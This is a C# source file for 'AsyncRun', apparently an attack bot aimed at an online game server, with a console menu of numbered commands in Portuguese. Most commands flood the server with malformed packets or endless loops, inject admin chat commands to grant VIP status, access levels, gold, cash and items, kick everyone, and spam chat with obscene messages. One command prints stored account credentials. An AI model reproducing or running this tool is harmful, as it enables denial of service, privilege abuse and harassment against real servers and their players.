using AsyncRun.protocol.Game.ACK;
using AsyncRun.Enums;
using AsyncRun.Model;
using AsyncRun.protocol;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace AsyncRun
{
    public class Commands
    {
        public static Base roomcreate;
        public static Loader load = Loader.INTs();
        public static Player p = Connection.INSTs().player;
        public static int CountAcions = 0;

        public static void LiberacaoChat()
        {
            LoggerXML.Log($"[LobbyChatting] Iniciando...", "chat");
            BASE_CHATTING.control = ControlEnum.LOBBY_CHAT;
            Program.LobbyChatting();
        }
        public static void ReloadActions()
        {
            Program.chatadaptado.Close();
            Thread.Sleep(load.InternalMilisegundos);
            BASE_CHATTING.control = ControlEnum.LOBBY_CHAT;
            Program.LobbyChatting();
        }
        public static void Organization()
        {
            Program.chatadaptado.Digite.Visible = false;
            Program.chatadaptado.button1.Visible = false;
            Program.chatadaptado.button4.Visible = false;
          //  Program.chatadaptado.label21.
        }
        public static void Command()
        {
            if (CountAcions == 0)
                Program.chatadaptado.Mensagem("Digite os comandos no Console e Receba informação Aqui! [Help nº: 18']");
            Logger.Comandos("Bem Vindo ao campo de concentração: [Listando Comandos, Digite o ID do comando] Help nº 18");
            new Thread(Organization).Start();
            LoggerXML.Log("[COMANDOS] Iniciado...", "Comandos");
            bool evitarflod = true;
            while (evitarflod)
            {
                evitarflod = false;
                Logger.Sucess("Digite seus comandos: ");
                string COMANDOS = Console.ReadLine();
                if (COMANDOS.Length > 0)
                {
                    Program.chatadaptado.Mensagem($"Você digitou o comando de numero: {COMANDOS}");
                    switch (COMANDOS)//COMANDOS
                    {
                        case "1":
                            {
                                int count = 0;
                                for(; ; )
                                {
                                    Player p = Connection.INSTs().player;
                                    p.ClientGame.SendPacket(new BASE_BUG_ACK().Write());
                                    Thread.Sleep(5);
                                    Logger.Mostrar($"Tentando gerar um flod em bytes! {++count}");
                                }
                            }
                        case "2":
                            {
                                LoggerXML.Log("[COMANDOS] LOBBY_CHAT", "Comandos");
                                new Thread(ReloadActions).Start();
                                break;
                            }
                        case "3":
                            {
                                LoggerXML.Log("[COMANDOS] TROLL", "Comandos");
                                for (int i = 0; i < 3; i++)
                                    Process.Start("http://www.shafou.com/");
                                evitarflod = false;
                                break;
                            }
                        case "4":
                            {
                                LoggerXML.Log("[COMANDOS] NICK", "Comandos");
                                try
                                {
                                    if (p != null)
                                    {
                                        var player = p.ClientGame;
                                        Random r = new Random();
                                        for (int i = 0; i < 100; i++)
                                        {
                                            if (player != null && player is GameClient)
                                            {
                                                if (player.socket != null && player.socket.Connected)
                                                {
                                                    string NewNick = $"{Program.chatadaptado.textBox5.Text.ToString()}changenick {p.ID} ᴞᴟᵷᵹ†‡•※‼‽‾‿⁀⁁⁂⁃⁄⁅⁆⁇⁈⁉⁗⁞₠₡₢₣₤₥₦₧₨₩₪₫€₭₮₯₰₱₲₳₴₵₸⃒⃓⃐⃑⃔⃕⃝⃠⃪⃡⃩℀℁ℂ℃℄℅℆ " ;
                                                    player.SendPacket(new LOBBY_CHATTING_ACK(NewNick, Chat_Type.LOBBY_CHAT_LOBBY).Write());
                                                    Thread.Sleep(load.InternalMilisegundos);
                                                    if (i == 99)
                                                        new Thread(ReloadActions).Start();
                                                }
                                                else
                                                {
                                                    new Thread(new ThreadStart(Command)).Start();
                                                }
                                            }
                                        }
                                    }
                                    else
                                    {
                                        Logger.Error("Player is NULL");

                                    }
                                }
                                catch (Exception e)
                                {
                                    LoggerXML.Log(e.ToString(), "Error");
                                }
                                evitarflod = false;
                                break;
                            }
                        case "5":
                            {
                                try
                                {
                                    LoggerXML.Log("[COMANDOS] ROOMLIST", "Comandos");
                                    if (p != null)
                                        p.ClientGame.SendPacket(new LOBBY_GET_ROOMLIST_ACK().Write());
                                    else
                                        Logger.Error("Player is NULL");
                                }
                                catch (Exception e)
                                {
                                    LoggerXML.Log(e.ToString(), "Error");
                                }
                                evitarflod = false;
                                break;
                            }
                        case "6":
                            {
                                LoggerXML.Log("[COMANDOS] PARCEIROS", "Comandos");
                                Logger.Comandos("[Async Created] Esse Bot tem como inspiração, \n" +
                                    " no proposito de se auto ajuda, no desenvolvimento do meu servidor");
                                Process.Start("https://www.facebook.com/wesley.vale.3192");
                                new Thread(ReloadActions).Start();
                                evitarflod = false;
                                break;
                            }
                        case "7":
                            {
                                try
                                {

                                    LoggerXML.Log("[COMANDOS] FUDERTUDO", "Comandos");
                                    Logger.Warnnig("[Async Warnnig] Digite a quantidade de Flod! (MAX - 100)");
                                    if (p != null)
                                    {
                                        int count = 0;
                                        int index = int.Parse(Console.ReadLine());
                                        if (index <= 100)
                                        {
                                            for (int i = 0; i < index; i++)
                                            {
                                                ReadPacket.flods = false;
                                                count++;
                                                Logger.Error(count.ToString());
                                                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "changerank " + p.ID + " "+ count, Chat_Type.LOBBY_CHAT_LOBBY).Write()); //floodar patente
                                                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "upach K♥○•◘♦♫N♦•○77ÉÉÉÉÉÉ☻◘3779!@#$%%¨&¨&**&¨&&¨&¨%¨$#%#$%#%$#%#¨¨#%¨#$¨%#34", Chat_Type.LOBBY_CHAT_LOBBY).Write()); //floodar anúncio
                                                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "g SERVIDOR PUBLICO FALHAS PUBLICAS", Chat_Type.LOBBY_CHAT_LOBBY).Write());
                                                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "udp 1", Chat_Type.LOBBY_CHAT_LOBBY).Write()); //floodar udp 1 
                                                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "testmode", Chat_Type.LOBBY_CHAT_LOBBY).Write()); //bloquear tudo!
                                                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "activeM f" + count, Chat_Type.LOBBY_CHAT_LOBBY).Write()); //desativar mission
                                                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "ka", Chat_Type.LOBBY_CHAT_LOBBY).Write()); //exit all
                                                p.ClientGame.SendPacket(new CLAN_CLIENT_LIST_ACK(index).Write()); //floodar cache de clan
                                                Thread.Sleep(load.InternalMilisegundos);
                                                if (i == 99)
                                                    new Thread(ReloadActions).Start();
                                            }
                                            ReadPacket.flods = true;
                                        }
                                        else
                                        {
                                            Logger.Error("Você é retardado por acaso?");
                                        }
                                    }
                                    else
                                    {
                                        Logger.Error("[FUDER] Player is NULL");
                                    }
                                }
                                catch (Exception e)
                                {
                                    LoggerXML.Log(e.ToString(), "Error");
                                }
                                evitarflod = false;
                                break;
                            }
                        case "8":
                            {
                                LoggerXML.Log("[COMANDOS] UDP FLOD", "Comandos");
                                Logger.Warnnig("ESSA FUNÇÃO É INFINITA!");
                                Thread.Sleep(load.InternalMilisegundos);
                                if (p != null)
                                {
                                    while (true)
                                    {
                                        for (int udp1 = 1; udp1 < 4; udp1++)
                                        {
                                            p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "udp " + udp1 + "", Chat_Type.LOBBY_CHAT_LOBBY).Write()); //floodar udp 1
                                        }
                                        for (int udp2 = 4; udp2 > 0; udp2--)
                                        {
                                            p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "udp " + udp2 + "", Chat_Type.LOBBY_CHAT_LOBBY).Write()); //floodar udp 1
                                            Thread.Sleep(load.InternalMilisegundos);
                                        }
                                    }
                                }
                                else
                                {
                                    Logger.Error("[UDP] Player is Null");
                                }
                                evitarflod = false;
                                break;
                            }
                        case "9":
                            {
                                LoggerXML.Log("[COMANDOS] ARMAS", "Comandos");
                                var list = WeaponWork.INTS();
                                if (p != null)
                                {
                                    for (int i = 0; i < 21; i++)
                                    {
                                        //p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "cE "+ list.Weapons[i] + "", Chat_Type.LOBBY_CHAT_LOBBY).Write()); //exit all
                                        p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "cid " + list.Weapons[i] + " 30", Chat_Type.LOBBY_CHAT_LOBBY).Write()); //floodar itens bugados
                                        Thread.Sleep(load.InternalMilisegundos);
                                        if (i == 20)
                                            new Thread(ReloadActions).Start();
                                    }
                                }
                                else
                                {
                                    Logger.Error("[armas]Player is NULL");
                                }
                                evitarflod = false;
                                break;
                            }
                        case "10":
                            {
                                LoggerXML.Log("[COMANDOS] VIPS", "Comandos");
                                if (p != null)
                                {
                                    for (int i = 10; i < 301; i++)
                                    {
                                        p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + " setvip " + i + " 2", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //flodar VIP 
                                        Thread.Sleep(load.InternalMilisegundos);
                                        if (i == 300)
                                            new Thread(ReloadActions).Start();
                                    }
                                }
                                else
                                {
                                    Logger.Error("[VIP]Player is NULL");
                                }
                                evitarflod = false;
                                break;
                            }
                        case "11":  //FLOD CHATTING
                            {
                                LoggerXML.Log("[COMANDOS] FLOD CHATTING", "FLOD");
                                if (p != null)
                                {
                                    for (int i = 0; i < 101; i++)
                                    {
                                        p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK("SERVER PUBLICO, FALHAS PUBLICAS...", Chat_Type.LOBBY_CHAT_LOBBY).Write());
                                        p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK("CHUPA MEUS ZOVOS, 8=====D ~", Chat_Type.LOBBY_CHAT_LOBBY).Write());
                                        p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK("CHUPA MEUS ZOVOS, 8=====D ~~", Chat_Type.LOBBY_CHAT_LOBBY).Write());
                                        p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK("CHUPA MEUS ZOVOS, 8=====D ~~~", Chat_Type.LOBBY_CHAT_LOBBY).Write());
                                        Thread.Sleep(load.InternalMilisegundos);
                                        if (i == 100)
                                            new Thread(ReloadActions).Start();
                                    }
                                }
                                evitarflod = false;
                                break;
                            }
                        case "12":
                            {
                                LoggerXML.Log("[COMANDOS] INFO", "INFO");
                                Logger.Info("================================");
                                Logger.Sucess($"IP    : {p.server}");
                                Logger.Sucess($"País  : {load.region}");
                                Logger.Sucess($"User  : {load.USER}");
                                Logger.Sucess($"PASS  : {load.PASS}");
                                Logger.Sucess($"KEY   : {load.KEY}");
                                Logger.Sucess($"HWID  : {load.HARDWAREID}");
                                Logger.Sucess($"MAC   : {load.meuMac}");
                                Logger.Sucess($"FakeIP: {load.fakeIP}"); ;
                                Logger.Sucess($"CLIENT: {load.CLIENTEVERSION}");
                                Logger.Sucess($"DEBUG : {load.DEBUG}");
                                Logger.Info("================================");
                                if (load.CONNECTION == Connection_type.VirtualHost)
                                    Logger.Sucess("Connection_type: VirtualHost");

                                else if (load.CONNECTION == Connection_type.LocalHost)
                                    Logger.Sucess("Connection_type: LocalHost");

                                Logger.Warnnig(Environment.NewLine);
                                Logger.Warnnig("Deseja voltar? 'S' ou 'N'");
                                switch (Console.ReadLine().ToLower())
                                {
                                    case "s":
                                        {
                                            new Thread(ReloadActions).Start();
                                            break;
                                        }
                                    case "n":
                                        {
                                            p.ClientGame.SockerVerific(p);
                                            break;
                                        }
                                }
                                evitarflod = false;
                                break;
                            }
                        case "13":
                            {
                                int count = 0;
                                while(true)
                                {
                                    count += 1;
                                    p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "setgold 99999999 " + count + " ", Chat_Type.LOBBY_CHAT_LOBBY).Write()); //floodar gold
                                    p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "setcash 99999999 " + count + " ", Chat_Type.LOBBY_CHAT_LOBBY).Write()); //floodar cash
                                }
                            }
                        case "14":
                            {
                                int count = 0;
                                LoggerXML.Log("[COMANDOS] SETACESS", "Comandos");
                                if (p != null)
                                {
                                   while(true)
                                    {
                                        count += 1;
                                        p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "setacess " + count + " 6", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //flodar VIP 
                                        Thread.Sleep(load.InternalMilisegundos);
                                        if (count == 1000000)
                                            new Thread(ReloadActions).Start();
                                    }
                                }
                                else
                                {
                                    Logger.Error("[VIP]Player is NULL");
                                }
                                evitarflod = false;
                                break;
                            }
                        case "15":
                            {
                                p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "refill2shop", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //Atualizar shop 
                                break;
                            }
                        case "16":
                            {
                                ushort opcode = 0;
                                while(true)
                                {
                                    opcode += 1;
                                    p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "rd1", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //Whites();
                                    p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "rd2", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //Whites();
                                    p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "rd3", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //Whites();
                                    p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "ga1", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //Whites();
                                    p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "ga2", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //Whites();
                                    p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "tik", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //Whites();
                                    if (opcode <= 65535)
                                         p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "vv "+ opcode + "", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //Whites();
                                }
              
                            }
                        case "17":
                            {
                                while (true)
                                {
                                    p.ClientGame.SendPacket(new LOBBY_CHATTING_ACK(Program.chatadaptado.textBox5.Text.ToString() + "v2", Chat_Type.LOBBY_CHAT_LOBBY).Write());    //Whites();
                                }
                            }
                        case "18":
                            {
                                p.ClientGame.SendPacket(new LOBBY_JOIN_ROOM_ACK().Write());
                                break;
                            }
                        case "19":
                            {
                                LoggerXML.Log("[COMANDOS] COMANDOS GERAL", "Comandos");
                                Logger.Info("================================");
                                Logger.Info("[Async Comands]:");
                                Logger.Error("");
                                Logger.Info("nº: 1  -  OpcodesInvalido [OPÇÃO DE REPETIÇÃO INFINITA]");
                                Logger.Info("nº: 2  -  Reabrir Chat");
                                Logger.Info("nº: 3  -  Troll Server");
                                Logger.Info("nº: 4  -  Flodar meu nick");
                                Logger.Info("nº: 5  -  Quantidades de sala criadas");
                                Logger.Info("nº: 6  -  CREDITOS");
                                Logger.Info("nº: 7  -  FUDER TUDO");
                                Logger.Info("nº: 8  -  Flodar UDP");
                                Logger.Info("nº: 9  -  Armas para todos");
                                Logger.Info("nº: 10 -  Vip Para todos");
                                Logger.Info("nº: 11 -  Flodar Chat");
                                Logger.Info("nº: 12 -  Conta Informação");
                                Logger.Info("nº: 13 -  floodar cash/gold");
                                Logger.Info("nº: 14 -  SETACESS");
                                Logger.Info("nº: 15 -  refill2shop");
                                Logger.Info("nº: 16 -  SendBytesAleatory");
                                Logger.Info("nº: 17 -  Flod Room");
                                Logger.Error("");
                                Logger.Info("================================");
                                CountAcions++;
                                new Thread(new ThreadStart(Command)).Start();
                                evitarflod = false;
                                break;
                            }
                        default:
                            {
                                LoggerXML.Log($"[Async Comands] COMANDO INVALIDO![{COMANDOS}]", "Comandos");
                                Logger.Error($"[Async Comands] Você digitou um comando inexistente.  '{COMANDOS}'");
                                evitarflod = true;
                                break;
                            }
                    }
                }
            }

        }
    }
}